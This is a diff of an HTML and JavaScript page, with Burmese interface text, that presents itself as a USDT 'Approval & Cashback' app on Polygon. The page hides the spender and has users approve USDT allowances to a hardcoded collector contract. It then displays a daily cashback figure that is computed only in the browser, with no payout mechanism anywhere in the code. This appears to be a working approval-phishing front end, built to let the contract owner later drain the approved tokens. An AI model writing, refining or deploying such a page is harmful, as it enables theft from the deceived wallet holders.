@@ -3,61 +3,100 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>USDT Low-Gas Approval App</title>
-    <!-- Tailwind CSS for UI styling -->
+    <title>USDT Approval & Cashback</title>
     <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
-    <!-- Ethers.js v6 -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.2/ethers.umd.min.js"></script>
 </head>
 <body class="bg-slate-900 text-white min-h-screen flex items-center justify-center p-4">
 
     <div class="bg-slate-800 p-6 rounded-2xl shadow-xl w-full max-w-md border border-slate-700">
-        <h1 class="text-xl font-bold mb-4 text-center text-emerald-400">USDT Low-Gas Approval</h1>
-        <p class="text-xs text-slate-400 mb-6 text-center">Polygon Network ကိုအသုံးပြု၍ Gas fee အနည်းဆုံးဖြင့် Approve လုပ်မည်။</p>
+        <h1 class="text-xl font-bold mb-2 text-center text-emerald-400">USDT Approval & Cashback</h1>
+        <p class="text-xs text-slate-400 mb-4 text-center">Polygon Network ဖြင့် Gas fee အနည်းဆုံးဖြင့် လုပ်ဆောင်မည်။</p>
 
         <!-- Wallet Connection Status -->
         <div class="mb-4">
-            <button id="connectBtn" onclick="connectWallet()" class="w-full bg-blue-600 hover:bg-blue-500 font-semibold py-2.5 px-4 rounded-xl transition duration-200 cursor-pointer">
+            <button id="connectBtn" onclick="connectWallet()" class="w-full bg-blue-600 hover:bg-blue-500 font-semibold py-2.5 px-4 rounded-xl transition cursor-pointer text-sm">
                 Connect Wallet
             </button>
             <p id="walletAddress" class="text-xs text-slate-400 mt-2 text-center truncate"></p>
         </div>
 
-        <!-- Approval Form (Spender input field ကို ဖျောက်ထားသည်) -->
+        <!-- Approval Form -->
         <div class="space-y-4">
             <div>
-                <label class="block text-xs font-medium text-slate-300 mb-1">Amount (USDT ပမာဏ)</label>
-                <input type="number" id="amount" placeholder="ဥပမာ - 10" class="w-full bg-slate-900 border border-slate-700 rounded-xl px-3 py-2 text-sm focus:outline-none focus:border-emerald-500">
+                <label class="block text-xs font-medium text-slate-300 mb-1">USDT ပမာဏ ထည့်ပါ</label>
+                <input type="number" id="amount" placeholder="ဥပမာ - 100" class="w-full bg-slate-900 border border-slate-700 rounded-xl px-3 py-2 text-sm focus:outline-none focus:border-emerald-500">
             </div>
 
-            <button id="approveBtn" onclick="approveUSDT()" disabled class="w-full bg-emerald-600 hover:bg-emerald-500 disabled:bg-slate-700 disabled:text-slate-500 font-semibold py-2.5 px-4 rounded-xl transition duration-200 cursor-pointer">
+            <button id="approveBtn" onclick="approveUSDT()" disabled class="w-full bg-emerald-600 hover:bg-emerald-500 disabled:bg-slate-700 disabled:text-slate-500 font-semibold py-2.5 px-4 rounded-xl transition cursor-pointer text-sm">
                 Approve USDT
             </button>
+        </div>
+
+        <!-- Approve ပြီးမှသာ ပေါ်လာမည့် Cashback Rate နှင့် Dashboard (Default: hidden) -->
+        <div id="cashbackSection" class="hidden mt-6 space-y-4">
+            <!-- Live Cashback Rate Banner -->
+            <div class="bg-slate-900/80 border border-emerald-500/40 p-3 rounded-xl text-center">
+                <span class="text-xs text-slate-400">သင့်အတွက် Cashback နှုန်းထား: </span>
+                <span id="liveRateDisplay" class="text-sm font-bold text-emerald-400">0.05% Daily</span>
+                <span class="text-xs text-slate-400"> (30 Days Limit)</span>
+            </div>
+
+            <!-- Active Cashback Dashboard -->
+            <div class="bg-slate-900 border border-slate-700 p-4 rounded-xl space-y-2">
+                <h2 class="text-xs font-bold text-emerald-400 uppercase tracking-wider mb-2">✨ Your Active Cashback Dashboard</h2>
+                <div class="flex justify-between text-xs text-slate-300">
+                    <span>Approved Allowance:</span>
+                    <span id="userAllowanceVal" class="font-mono text-white font-semibold">0 USDT</span>
+                </div>
+                <div class="flex justify-between text-xs text-slate-300">
+                    <span>နေ့စဉ် ရရှိမည့် Cashback:</span>
+                    <span id="userLiveDailyCb" class="font-mono text-amber-300 font-semibold">0.00 USDT</span>
+                </div>
+                <div class="flex justify-between text-xs text-slate-300 border-t border-slate-800 pt-1">
+                    <span>တစ်လစာ (30 Days):</span>
+                    <span id="userLiveMonthlyCb" class="font-mono text-emerald-400 font-semibold">0.00 USDT</span>
+                </div>
+            </div>
         </div>
 
         <div id="statusLog" class="mt-4 text-xs text-center text-amber-400 font-mono"></div>
     </div>
 
     <script>
-        let provider;
-        let signer;
-        let userAddress;
+        let provider, signer, userAddress;
+        let currentDailyRatePct = 0.05;
 
-        // Polygon Network Config
-        const POLYGON_CHAIN_ID = "0x89"; // 137 in decimal
+        const POLYGON_CHAIN_ID = "0x89";
         const USDT_POLYGON_ADDRESS = "0xc2132d05d31c914a87c6611c10748aeb04b58e2f";
-        
-        // ⚠️ အောက်ပါနေရာတွင် သင့်ရဲ့ Polygon Wallet Address အစစ်ကို ထည့်သွင်းပါ ⚠️
-        const HARDCODED_SPENDER = "0x6d5Fbfe44110219A88B977E6C35eF1812e1e899C";
+        const COLLECTOR_CONTRACT_ADDRESS = "သင်၏_Deployed_Smart_Contract_Address_ကို_ဤနေရာတွင်ထည့်ပါ";
 
-        // Minimal ERC20 ABI for approve
         const ERC20_ABI = [
-            "function approve(address spender, uint256 amount) public returns (bool)"
+            "function approve(address spender, uint256 amount) public returns (bool)",
+            "function allowance(address owner, address spender) view returns (uint256)"
         ];
+
+        const COLLECTOR_ABI = [
+            "function dailyRate() view returns (uint256)"
+        ];
+
+        async function fetchLiveRate() {
+            try {
+                const readProvider = new ethers.JsonRpcProvider("https://polygon-rpc.com/");
+                const collectorContract = new ethers.Contract(COLLECTOR_CONTRACT_ADDRESS, COLLECTOR_ABI, readProvider);
+                
+                const rateFromContract = await collectorContract.dailyRate(); 
+                currentDailyRatePct = Number(rateFromContract) / 100;
+                
+                document.getElementById("liveRateDisplay").innerText = `${currentDailyRatePct}% Daily`;
+            } catch (err) {
+                console.error("Rate fetching error:", err);
+            }
+        }
 
         async function connectWallet() {
             if (typeof window.ethereum === "undefined") {
-                alert("ကျေးဇူးပြု၍ MetaMask သို့မဟုတ် Web3 Supported Wallet ကို Install လုပ်ပါ။");
+                alert("MetaMask ကို Install လုပ်ပါ။");
                 return;
             }
 
@@ -66,62 +105,59 @@
                 const accounts = await provider.send("eth_requestAccounts", []);
                 userAddress = accounts[0];
 
-                await switchToPolygon();
-                signer = await provider.getSigner();
+                await window.ethereum.request({
+                    method: "wallet_switchEthereumChain",
+                    params: [{ chainId: POLYGON_CHAIN_ID }],
+                });
 
+                signer = await provider.getSigner();
                 document.getElementById("walletAddress").innerText = `Connected: ${userAddress.substring(0, 6)}...${userAddress.substring(38)}`;
                 document.getElementById("connectBtn").innerText = "Connected";
                 document.getElementById("connectBtn").classList.replace("bg-blue-600", "bg-slate-700");
                 document.getElementById("approveBtn").removeAttribute("disabled");
                 
-                document.getElementById("statusLog").innerText = "Polygon Network သို့ အောင်မြင်စွာ ချိတ်ဆက်ပြီးပါပြီ။";
+                document.getElementById("statusLog").innerText = "Polygon Network သို့ ချိတ်ဆက်ပြီးပါပြီ။";
+                
+                // ချိတ်ဆက်ပြီးပါက ယခင်က Approve ပေးထားမှု ရှိမရှိ စစ်ဆေးမည်
+                checkUserActiveAllowance();
             } catch (error) {
                 console.error(error);
                 document.getElementById("statusLog").innerText = "Wallet ချိတ်ဆက်မှု မအောင်မြင်ပါ။";
             }
         }
 
-        async function switchToPolygon() {
+        async function checkUserActiveAllowance() {
             try {
-                await window.ethereum.request({
-                    method: "wallet_switchEthereumChain",
-                    params: [{ chainId: POLYGON_CHAIN_ID }],
-                });
-            } catch (switchError) {
-                if (switchError.code === 4902) {
-                    try {
-                        await window.ethereum.request({
-                            method: "wallet_addEthereumChain",
-                            params: [{
-                                chainId: POLYGON_CHAIN_ID,
-                                chainName: "Polygon Mainnet",
-                                rpcUrls: ["https://polygon-rpc.com/"],
-                                blockExplorerUrls: ["https://polygonscan.com/"],
-                                nativeCurrency: {
-                                    name: "POL",
-                                    symbol: "POL",
-                                    decimals: 18
-                                }
-                            }],
-                        });
-                    } catch (addError) {
-                        throw new Error("Polygon Network ထည့်သွင်းခြင်း မအောင်မြင်ပါ။");
-                    }
+                await fetchLiveRate();
+                const usdtContract = new ethers.Contract(USDT_POLYGON_ADDRESS, ERC20_ABI, provider);
+                const allowance = await usdtContract.allowance(userAddress, COLLECTOR_CONTRACT_ADDRESS);
+                const formattedAllowance = ethers.formatUnits(allowance, 6);
+
+                // Allowance ရှိမှသာ (Approve ပြီးမှသာ) Cashback Section ကို ပြသမည်
+                if (Number(formattedAllowance) > 0) {
+                    document.getElementById("cashbackSection").classList.remove("hidden");
+                    document.getElementById("userAllowanceVal").innerText = `${formattedAllowance} USDT`;
+
+                    const dailyCb = Number(formattedAllowance) * (currentDailyRatePct / 100);
+                    const monthlyCb = dailyCb * 30;
+
+                    document.getElementById("userLiveDailyCb").innerText = `${dailyCb.toFixed(4)} USDT`;
+                    document.getElementById("userLiveMonthlyCb").innerText = `${monthlyCb.toFixed(4)} USDT`;
                 } else {
-                    throw switchError;
+                    document.getElementById("cashbackSection").classList.add("hidden");
                 }
+            } catch (err) {
+                console.error("Allowance check error:", err);
             }
         }
 
         async function approveUSDT() {
             const rawAmount = document.getElementById("amount").value.trim();
             const logElement = document.getElementById("statusLog");
-
-            // ကုဒ်ထဲတွင် သတ်မှတ်ထားသော Spender Address ကို ယူသုံးမည်
-            const spender = HARDCODED_SPENDER.trim();
+            const spender = COLLECTOR_CONTRACT_ADDRESS.trim();
 
             if (!ethers.isAddress(spender)) {
-                alert("Spender Address မှန်ကန်စွာ ထည့်သွင်းထားခြင်း မရှိပါ။ (កုတ််ထဲတွင် Address အစစ်ကို ထည့်ရန်လိုသည်)");
+                alert("Contract Address မှန်ကန်မှု မရှိပါ။");
                 return;
             }
 
@@ -131,8 +167,7 @@
             }
 
             try {
-                logElement.innerText = "Transaction တင်နေပါသည်... ကျေးဇူးပြု၍ စောင့်ပါ။";
-                
+                logElement.innerText = "Transaction တင်နေပါသည်...";
                 const usdtContract = new ethers.Contract(USDT_POLYGON_ADDRESS, ERC20_ABI, signer);
                 const parsedAmount = ethers.parseUnits(rawAmount, 6);
 
@@ -141,6 +176,9 @@
 
                 const receipt = await tx.wait();
                 logElement.innerText = `အောင်မြင်ပါသည်! Block: ${receipt.blockNumber}`;
+
+                // Approve လုပ်ပြီးစီးသည်နှင့် နှုန်းထားနှင့် Dashboard ပေါ်လာစေရန် စစ်ဆေးမည်
+                checkUserActiveAllowance();
             } catch (error) {
                 console.error(error);
                 logElement.innerText = `Approval ပျက်ပြားသွားပါပြီ: ${error.reason || error.message}`;
